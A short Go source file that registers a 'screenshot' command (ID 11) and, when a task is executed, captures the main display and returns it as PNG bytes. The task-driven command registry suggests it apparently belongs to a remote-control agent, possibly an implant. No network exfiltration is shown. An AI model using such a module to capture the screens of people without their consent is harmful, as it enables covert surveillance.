package command

import (
	"bytes"
	"fmt"
	"image/png"
	"log"

	"github.com/kbinani/screenshot"
)

// CommandIDScreenshot 截图命令 ID
const CommandIDScreenshot uint32 = 11

// ScreenshotCommand 实现屏幕截图命令
type ScreenshotCommand struct{}

func init() {
	Register(&ScreenshotCommand{})
}

func (c *ScreenshotCommand) ID() uint32 {
	return CommandIDScreenshot
}

func (c *ScreenshotCommand) Name() string {
	return "screenshot"
}

func (c *ScreenshotCommand) Execute(task *Task) ([]byte, error) {
	log.Println("Taking screenshot...")

	// 获取显示器数量
	numDisplays := screenshot.NumActiveDisplays()
	if numDisplays == 0 {
		return nil, fmt.Errorf("no active displays found")
	}

	// 默认截取主显示器（索引 0）
	displayIndex := 0

	// 获取显示器边界
	bounds := screenshot.GetDisplayBounds(displayIndex)
	log.Printf("Capturing display %d: %dx%d", displayIndex, bounds.Dx(), bounds.Dy())

	// 截取屏幕
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return nil, fmt.Errorf("failed to capture screen: %v", err)
	}

	// 编码为 PNG
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		return nil, fmt.Errorf("failed to encode screenshot as PNG: %v", err)
	}

	log.Printf("Screenshot captured successfully, size: %d bytes", buf.Len())
	return buf.Bytes(), nil
}
